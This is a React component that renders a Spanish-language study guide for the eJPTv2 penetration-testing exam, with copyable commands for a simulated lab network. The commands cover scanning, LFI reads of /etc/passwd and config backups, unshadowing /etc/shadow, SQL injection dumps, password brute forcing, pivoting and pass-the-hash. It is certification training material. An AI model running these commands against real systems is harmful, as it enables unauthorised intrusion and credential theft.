import React, { useState } from 'react';
import { 
  BookOpen, 
  Terminal, 
  Network, 
  ShieldAlert, 
  Copy, 
  Check, 
  ChevronRight, 
  Flame, 
  Share2, 
  Layers,
  ExternalLink
} from 'lucide-react';

interface ExamGuideProps {
  onCopyCommand?: (cmd: string) => void;
}

export const ExamGuide: React.FC<ExamGuideProps> = ({ onCopyCommand }) => {
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);

  const copyCmd = (cmd: string) => {
    navigator.clipboard.writeText(cmd);
    setCopiedCmd(cmd);
    if (onCopyCommand) onCopyCommand(cmd);
    setTimeout(() => setCopiedCmd(null), 1800);
  };

  return (
    <div className="flex flex-col h-full bg-slate-950 border border-slate-800 rounded-xl overflow-hidden shadow-2xl">
      {/* Header */}
      <div className="p-4 bg-slate-900 border-b border-slate-800 flex items-center justify-between">
        <div className="flex items-center space-x-3">
          <div className="p-2 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-emerald-400">
            <BookOpen className="w-5 h-5" />
          </div>
          <div>
            <h2 className="text-base font-bold text-white tracking-wide">
              Guía de Preparación eJPTv2 & Metodología de Pivoting
            </h2>
            <p className="text-xs text-slate-400">
              Metodología completa paso a paso para superar el examen práctico eLearnSecurity Junior Penetration Tester v2
            </p>
          </div>
        </div>
      </div>

      {/* Guide Content */}
      <div className="flex-1 p-5 overflow-y-auto space-y-6 text-sm">
        
        {/* Un Fantasma en el Sistema Community Card */}
        <div className="p-4 rounded-xl bg-slate-900/90 border border-emerald-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 shadow-lg">
          <div className="flex items-center gap-3.5">
            <div className="w-12 h-12 rounded-xl bg-slate-950 border border-slate-800 p-1 flex items-center justify-center shrink-0 shadow-inner">
              <img 
                src="/icono.png" 
                alt="Un Fantasma en el Sistema" 
                className="w-full h-full object-contain filter drop-shadow" 
                referrerPolicy="no-referrer" 
              />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="font-bold text-white text-sm">Un Fantasma en el Sistema</h3>
                <span className="text-[10px] bg-emerald-500/20 text-emerald-400 font-semibold px-2 py-0.5 rounded-full border border-emerald-500/30">
                  Comunidad Oficial
                </span>
              </div>
              <p className="text-xs text-slate-300 mt-0.5">
                Artículos, tutoriales de hacking ético, herramientas y preparación para certificaciones de ciberseguridad.
              </p>
            </div>
          </div>
          <a
            href="https://www.unfantasmaenelsistema.com/"
            target="_blank"
            rel="noopener noreferrer"
            className="px-3.5 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold flex items-center gap-1.5 transition-colors shrink-0 shadow-md cursor-pointer"
          >
            <span>Visitar Web Oficial</span>
            <ExternalLink className="w-3.5 h-3.5" />
          </a>
        </div>

        {/* Intro Banner */}
        <div className="p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-blue-950/40 border border-emerald-500/30 flex items-start gap-3">
          <Flame className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
          <div>
            <h3 className="font-bold text-white text-sm">Estructura del Examen eJPTv2</h3>
            <p className="text-xs text-slate-300 mt-1 leading-relaxed">
              El examen eJPTv2 dura 48 horas continuas y evalúa habilidades prácticas en una red empresarial simulada. 
              El objetivo no es únicamente conseguir flags, sino responder 35 preguntas dinámicas basadas en los hallazgos 
              (versiones, contraseñas, configuraciones erróneas, pivoting y escalada de privilegios).
              Requiere un mínimo del <strong className="text-emerald-400">70% de aciertos (25 preguntas)</strong>.
            </p>
          </div>
        </div>

        {/* Phase 1: Recon & Footprinting */}
        <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-3">
          <div className="flex items-center gap-2">
            <span className="w-6 h-6 rounded-md bg-blue-500/20 text-blue-400 font-mono font-bold text-xs flex items-center justify-center">
              1
            </span>
            <h4 className="font-bold text-white text-sm">Fase 1: Reconocimiento & Descubrimiento de Red (DMZ)</h4>
          </div>
          <p className="text-xs text-slate-300">
            Verifica tu dirección IP en la interfaz de la VPN (tun0) y realiza un barrido de hosts activos en la subred 192.168.100.0/24:
          </p>
          <div className="space-y-2 font-mono text-xs">
            {[
              { label: 'Verificar IP de atacante:', cmd: 'ifconfig tun0' },
              { label: 'Descubrimiento ARP pasivo:', cmd: 'netdiscover -r 192.168.100.0/24' },
              { label: 'Ping sweep rápido con Nmap:', cmd: 'nmap -sn 192.168.100.0/24' },
              { label: 'Escaneo completo de puertos en objetivos:', cmd: 'nmap -sV -sC -p- 192.168.100.50' }
            ].map(item => (
              <div key={item.cmd} className="p-2 bg-slate-950 rounded-lg border border-slate-800/80 flex items-center justify-between">
                <div>
                  <span className="text-slate-500 block text-[10px]">{item.label}</span>
                  <span className="text-emerald-300">{item.cmd}</span>
                </div>
                <button
                  onClick={() => copyCmd(item.cmd)}
                  className="p-1 text-slate-400 hover:text-white transition-colors"
                  title="Copiar comando"
                >
                  {copiedCmd === item.cmd ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Phase 2: Web & Service Exploitation */}
        <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-3">
          <div className="flex items-center gap-2">
            <span className="w-6 h-6 rounded-md bg-purple-500/20 text-purple-400 font-mono font-bold text-xs flex items-center justify-center">
              2
            </span>
            <h4 className="font-bold text-white text-sm">Fase 2: Enumeración Web y Foothold en la DMZ</h4>
          </div>
          <p className="text-xs text-slate-300">
            Fuerza bruta de directorios en el servidor web (192.168.100.50) y explotación de vulnerabilidades LFI y SMB:
          </p>
          <div className="space-y-2 font-mono text-xs">
            {[
              { label: 'Fuzzing de directorios web:', cmd: 'gobuster dir -u http://192.168.100.50 -w /usr/share/wordlists/dirb/common.txt' },
              { label: 'Explotar LFI para leer /etc/passwd:', cmd: 'curl "http://192.168.100.50/blog/view.php?page=../../../../etc/passwd"' },
              { label: 'Extraer credenciales en archivo de backup:', cmd: 'curl "http://192.168.100.50/blog/view.php?page=../../../../var/backups/db_config.php.bak"' },
              { label: 'Enumerar recursos compartidos SMB en gateway:', cmd: 'smbclient -L //192.168.100.60 -N' },
              { label: 'Conectar al share público y leer scripts:', cmd: 'smbclient //192.168.100.60/public -N' }
            ].map(item => (
              <div key={item.cmd} className="p-2 bg-slate-950 rounded-lg border border-slate-800/80 flex items-center justify-between">
                <div>
                  <span className="text-slate-500 block text-[10px]">{item.label}</span>
                  <span className="text-emerald-300">{item.cmd}</span>
                </div>
                <button
                  onClick={() => copyCmd(item.cmd)}
                  className="p-1 text-slate-400 hover:text-white transition-colors"
                >
                  {copiedCmd === item.cmd ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Phase 3: The Critical Pivot */}
        <div className="p-4 rounded-xl bg-slate-900/80 border border-emerald-500/40 space-y-3">
          <div className="flex items-center gap-2">
            <span className="w-6 h-6 rounded-md bg-emerald-500/20 text-emerald-400 font-mono font-bold text-xs flex items-center justify-center">
              3
            </span>
            <h4 className="font-bold text-white text-sm flex items-center gap-2">
              <Share2 className="w-4 h-4 text-emerald-400" />
              Fase 3: PIVOTING - El Concepto Fundamental de eJPTv2
            </h4>
          </div>
          <p className="text-xs text-slate-300 leading-relaxed">
            Una de las máquinas de la DMZ (192.168.100.60) tiene dos tarjetas de red (Dual-Homed): 
            está conectada a la DMZ y a una red privada interna (10.10.10.0/24). Tu máquina Kali no puede 
            enviar paquetes directamente a 10.10.10.0/24. Debes usar la máquina comprometida como <strong>pivote</strong>:
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mt-2">
            {/* Technique A: SSH Dynamic Port Forwarding */}
            <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
              <span className="text-xs font-bold text-emerald-400 block font-mono">
                Método 1: SSH Dynamic Forwarding + Proxychains
              </span>
              <p className="text-[11px] text-slate-400">
                Abre un listener local SOCKS5 en el puerto 1080 ruteado a través de la máquina gateway:
              </p>
              <div className="p-1.5 bg-slate-900 rounded font-mono text-[11px] text-emerald-300 break-all">
                ssh -D 1080 -N -f pivotuser@192.168.100.60
              </div>
              <p className="text-[11px] text-slate-400">
                Luego ejecuta tus herramientas anteponiendo <code>proxychains</code>:
              </p>
              <div className="p-1.5 bg-slate-900 rounded font-mono text-[11px] text-emerald-300 break-all">
                proxychains nmap -sT -Pn 10.10.10.20
              </div>
            </div>

            {/* Technique B: Metasploit Autoroute */}
            <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
              <span className="text-xs font-bold text-purple-400 block font-mono">
                Método 2: Metasploit Autoroute & SOCKS Server
              </span>
              <p className="text-[11px] text-slate-400">
                Dentro de una sesión meterpreter en la máquina gateway o pivot:
              </p>
              <div className="p-1.5 bg-slate-900 rounded font-mono text-[11px] text-purple-300 break-all">
                meterpreter &gt; run autoroute -s 10.10.10.0/24
              </div>
              <p className="text-[11px] text-slate-400">
                Y levanta el servidor proxy SOCKS de Metasploit:
              </p>
              <div className="p-1.5 bg-slate-900 rounded font-mono text-[11px] text-purple-300 break-all">
                use auxiliary/server/socks_proxy
              </div>
            </div>
          </div>
        </div>

        {/* Phase 4: Attacking Internal Subnet */}
        <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-3">
          <div className="flex items-center gap-2">
            <span className="w-6 h-6 rounded-md bg-amber-500/20 text-amber-400 font-mono font-bold text-xs flex items-center justify-center">
              4
            </span>
            <h4 className="font-bold text-white text-sm">Fase 4: Explotación de la Red Interna (Windows & SQL)</h4>
          </div>
          <p className="text-xs text-slate-300">
            A través del túnel proxychains atacamos los objetivos internos (10.10.10.20 y 10.10.10.25):
          </p>
          <div className="space-y-2 font-mono text-xs">
            {[
              { label: 'Inyección SQL en base de datos interna:', cmd: 'proxychains sqlmap -u "http://10.10.10.20/api/employees?id=1" --dump' },
              { label: 'Crackeo de hash de contraseña de itadmin:', cmd: 'john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' },
              { label: 'Explotar Windows con PsExec en Metasploit:', cmd: 'msfconsole (use exploit/windows/smb/psexec)' },
              { label: 'Leer la flag de Windows en Meterpreter:', cmd: 'cat /Users/Administrator/Desktop/flag.txt' }
            ].map(item => (
              <div key={item.cmd} className="p-2 bg-slate-950 rounded-lg border border-slate-800/80 flex items-center justify-between">
                <div>
                  <span className="text-slate-500 block text-[10px]">{item.label}</span>
                  <span className="text-emerald-300">{item.cmd}</span>
                </div>
                <button
                  onClick={() => copyCmd(item.cmd)}
                  className="p-1 text-slate-400 hover:text-white transition-colors"
                >
                  {copiedCmd === item.cmd ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Phase 5: Password Attacks, Cracking & Pass-the-Hash */}
        <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-3">
          <div className="flex items-center gap-2">
            <span className="w-6 h-6 rounded-md bg-rose-500/20 text-rose-400 font-mono font-bold text-xs flex items-center justify-center">
              5
            </span>
            <h4 className="font-bold text-white text-sm">Fase 5: Ataques a Contraseñas, Cracking & Pass-the-Hash</h4>
          </div>
          <p className="text-xs text-slate-300">
            Identificación de algoritmos de hash, preparación de contraseñas de Linux con <code className="text-amber-300">unshadow</code>, fuerza bruta online y autenticación Pass-the-Hash:
          </p>
          <div className="space-y-2 font-mono text-xs">
            {[
              { label: 'Identificar tipo de hash (MD5, NTLM, SHA-512):', cmd: 'hashid "9a8a7c1b4e5f0d2a8b3c4d5e6f7a8b9c"' },
              { label: 'Descomprimir diccionario de Kali Linux:', cmd: 'gunzip /usr/share/wordlists/rockyou.txt.gz' },
              { label: 'Unir /etc/passwd y /etc/shadow para John:', cmd: 'unshadow /etc/passwd /etc/shadow > unshadowed.txt' },
              { label: 'Crackear hashes de Linux con John the Ripper:', cmd: 'john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt' },
              { label: 'Crackear hashes con Hashcat (modo 1800 SHA512):', cmd: 'hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt' },
              { label: 'Fuerza bruta FTP con Medusa:', cmd: 'medusa -h 192.168.100.55 -u mike -P /usr/share/wordlists/rockyou.txt -M ftp' },
              { label: 'Fuerza bruta SSH con Hydra y cruce de usuarios:', cmd: 'hydra -L /root/loot/users.txt -P /root/loot/passwords.txt 192.168.100.55 ssh' },
              { label: 'Fuerza bruta WordPress con WPScan:', cmd: 'wpscan --url http://192.168.100.50/blog -U sysadmin -P /usr/share/wordlists/rockyou.txt' },
              { label: 'Acceso RDP Windows con FreeRDP:', cmd: 'proxychains xfreerdp /v:10.10.10.25 /u:Administrator /p:P@ssw0rd2024! /cert:ignore' },
              { label: 'Consola WinRM con Evil-WinRM:', cmd: "proxychains evil-winrm -i 10.10.10.25 -u itadmin -p 'P@ssw0rd2024!'" },
              { label: 'Autenticación Pass-the-Hash directa en Windows (Impacket):', cmd: 'proxychains psexec.py -hashes :9a8a7c1b4e5f0d2a8b3c4d5e6f7a8b9c Administrator@10.10.10.25' }
            ].map(item => (
              <div key={item.cmd} className="p-2 bg-slate-950 rounded-lg border border-slate-800/80 flex items-center justify-between">
                <div>
                  <span className="text-slate-500 block text-[10px]">{item.label}</span>
                  <span className="text-emerald-300">{item.cmd}</span>
                </div>
                <button
                  onClick={() => copyCmd(item.cmd)}
                  className="p-1 text-slate-400 hover:text-white transition-colors cursor-pointer"
                  title="Copiar comando"
                >
                  {copiedCmd === item.cmd ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Metodología eJPTv2 de r1vs3c (Juan Rivas) */}
        <div className="p-4 rounded-xl bg-gradient-to-r from-slate-900 via-slate-900 to-emerald-950/40 border border-emerald-500/40 space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <div className="flex items-center gap-2.5">
              <span className="w-6 h-6 rounded-md bg-emerald-500/20 text-emerald-400 font-bold text-xs flex items-center justify-center">
                ★
              </span>
              <div>
                <h4 className="font-bold text-white text-sm flex items-center gap-2">
                  Metodología eJPTv2 de r1vs3c (10 Consejos para Aprobar a la Primera)
                </h4>
                <p className="text-[11px] text-slate-400">
                  Estrategia recomendada por Juan Rivas (r1vs3c) basada en su experiencia real en el examen
                </p>
              </div>
            </div>
          </div>

          {/* 10 Consejos de r1vs3c */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">1. Escaneo Global DMZ (Ahorro Masivo de Tiempo)</span>
              <p className="text-slate-300 text-[11px]">
                Realiza un escaneo global a todos los hosts de la DMZ (<code>nmap -sS -p- --open 192.168.100.0/24</code>) en lugar de ir uno a uno. Con este único reporte responderás casi todas las preguntas de la DMZ al inicio.
              </p>
            </div>

            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">2. Mapeo Visual de la Red</span>
              <p className="text-slate-300 text-[11px]">
                Representa gráficamente la configuración de red con la pestaña <strong>Mapa de Red</strong> o draw.io / excalidraw, anotando hostnames, IPs y servicios clave.
              </p>
            </div>

            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">3. Lectura Detallada (Filtrar Máquinas Relleno)</span>
              <p className="text-slate-300 text-[11px]">
                Lee todas las preguntas al inicio porque están desordenadas. Esto te permite identificar qué máquinas son relleno innecesario y cuáles son los objetivos reales a comprometer.
              </p>
            </div>

            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">4. Estrategia &quot;Responde por Host&quot;</span>
              <p className="text-slate-300 text-[11px]">
                No contestes en el orden numérico del examen. Utiliza el filtro <strong>&quot;Metodología r1vs3c: Responder por Host&quot;</strong> en la pestaña de Preguntas para responder todas las preguntas de una máquina mientras tienes su contexto fresco.
              </p>
            </div>

            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">5. Documentación Sistemática en Cuaderno</span>
              <p className="text-slate-300 text-[11px]">
                Anota todo lo que descubras (IPs, usuarios, hashes, servicios y notas) en la pestaña <strong>Cuaderno de Notas</strong> o CherryTree/Obsidian para recuperarlo al instante.
              </p>
            </div>

            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">6. Gestión del Tiempo y Descansos</span>
              <p className="text-slate-300 text-[11px]">
                Tienes 48 horas continuas. No es una carrera. Si te sientes atascado, toma un descanso para despejar la mente y regresar con ideas frescas.
              </p>
            </div>

            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">7. Aprovecha las Pistas Cruzadas</span>
              <p className="text-slate-300 text-[11px]">
                Muchas preguntas del examen te dan pistas directas o revelan nombres de usuarios y servicios útiles para resolver otras preguntas del cuestionario.
              </p>
            </div>

            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">8. Cheat Sheets Accesibles</span>
              <p className="text-slate-300 text-[11px]">
                El examen permite el uso libre de material de consulta. Ten a mano tus comandos habituales de Metasploit, pivoting y fuerza bruta.
              </p>
            </div>

            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">9. Fuerza Bruta Metódica en CMS y Servicios</span>
              <p className="text-slate-300 text-[11px]">
                Usa diccionarios de Kali (<code>rockyou.txt</code>) para atacar formularios web y servicios expuestos con <code>wpscan</code>, <code>hydra</code> y <code>crackmapexec</code>.
              </p>
            </div>

            <div className="p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 space-y-1">
              <span className="font-bold text-emerald-400 block">10. Simplicidad con Herramientas Nativas</span>
              <p className="text-slate-300 text-[11px]">
                No te compliques con scripts externos no probados. Todo lo necesario para superar el eJPTv2 ya viene preinstalado en el laboratorio de Kali Linux.
              </p>
            </div>
          </div>

          {/* Herramientas Imprescindibles destacadas por r1vs3c */}
          <div className="mt-3 pt-3 border-t border-slate-800">
            <h5 className="font-bold text-slate-200 text-xs mb-2">
              Herramientas Imprescindibles eJPTv2 (Comandos Rápidos):
            </h5>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 font-mono text-[11px]">
              {[
                { tool: 'dirb', desc: 'Fuerza bruta de directorios web', cmd: 'dirb http://192.168.100.50' },
                { tool: 'arp-scan', desc: 'Descubrimiento rápido local', cmd: 'arp-scan -l' },
                { tool: 'nmap', desc: 'Escaneo global de la DMZ', cmd: 'nmap -sS -p- --open 192.168.100.0/24' },
                { tool: 'wpscan', desc: 'Enumeración y crackeo WordPress', cmd: 'wpscan --url http://192.168.100.50/blog -U sysadmin -P /usr/share/wordlists/rockyou.txt' },
                { tool: 'crackmapexec', desc: 'Explotación y Pass-the-Hash SMB', cmd: 'proxychains crackmapexec smb 10.10.10.25 -u itadmin -p P@ssw0rd2024!' },
                { tool: 'msfconsole', desc: 'Metasploit exploit & pivoting', cmd: 'msfconsole' },
                { tool: 'searchsploit', desc: 'Búsqueda offline de exploits', cmd: 'searchsploit apache 2.4' },
                { tool: 'hydra', desc: 'Fuerza bruta multi-protocolo', cmd: 'hydra -L /root/loot/users.txt -P /root/loot/passwords.txt 192.168.100.55 ssh' },
                { tool: 'xfreerdp', desc: 'Acceso escritorio remoto RDP', cmd: 'proxychains xfreerdp /v:10.10.10.25 /u:Administrator /p:P@ssw0rd2024! /cert:ignore' },
                { tool: 'evil-winrm', desc: 'Consola PowerShell remota WinRM', cmd: "proxychains evil-winrm -i 10.10.10.25 -u itadmin -p 'P@ssw0rd2024!'" }
              ].map(item => (
                <div key={item.tool} className="p-2 bg-slate-950 rounded-lg border border-slate-800/80 flex items-center justify-between">
                  <div className="truncate pr-2">
                    <span className="text-emerald-400 font-bold">{item.tool}</span>
                    <span className="text-slate-500 text-[10px] block truncate">{item.desc}</span>
                    <span className="text-slate-300 text-[10px] block truncate">{item.cmd}</span>
                  </div>
                  <button
                    onClick={() => copyCmd(item.cmd)}
                    className="p-1 text-slate-400 hover:text-white transition-colors cursor-pointer shrink-0"
                    title={`Copiar comando de ${item.tool}`}
                  >
                    {copiedCmd === item.cmd ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  </button>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Key Exam Tips */}
        <div className="p-4 rounded-xl bg-slate-900/50 border border-slate-800 space-y-2 text-xs text-slate-300">
          <h4 className="font-bold text-amber-400 uppercase tracking-wider text-[11px] flex items-center gap-1.5">
            <span>💡 Consejos Críticos para el Examen Real (Técnicas eJPTv2)</span>
          </h4>
          <ul className="list-disc list-inside space-y-1.5 text-slate-300">
            <li><strong className="text-amber-300">Reutilización de Usuarios como Contraseñas:</strong> En el examen real es extremadamente típico que la contraseña de un equipo sea el nombre de usuario de otro equipo (o el mismo con prefijos/sufijos). Genera diccionarios cruzados con la herramienta <strong>Botín & Flags (Loot Vault)</strong> para fuerza bruta con Hydra.</li>
            <li>Toma notas constantes de cada IP, servicio, versión y credencial encontrada.</li>
            <li>En nmap a través de proxychains usa SIEMPRE <code>-sT -Pn</code>; los escaneos SYN (-sS) y ping no funcionan sobre SOCKS.</li>
            <li>Revisa siempre archivos de configuración, comentarios de código fuente y backups (.bak, .old, .zip).</li>
            <li>La mayoría de preguntas se responden verificando banners y tablas de bases de datos.</li>
          </ul>
        </div>

      </div>
    </div>
  );
};

export default ExamGuide;
